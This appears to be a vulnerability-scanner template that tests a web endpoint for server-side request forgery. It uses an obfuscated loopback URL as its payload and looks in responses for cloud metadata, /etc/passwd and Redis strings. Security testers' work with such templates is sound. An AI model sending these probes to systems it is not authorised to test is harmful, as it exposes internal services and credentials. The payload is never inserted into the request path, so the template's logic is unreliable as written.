id: ssrf5-0665
name: 'SSRF probe in endpoint'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via endpoint (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      endpoint:
        - 'http://0177.00.00.01/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
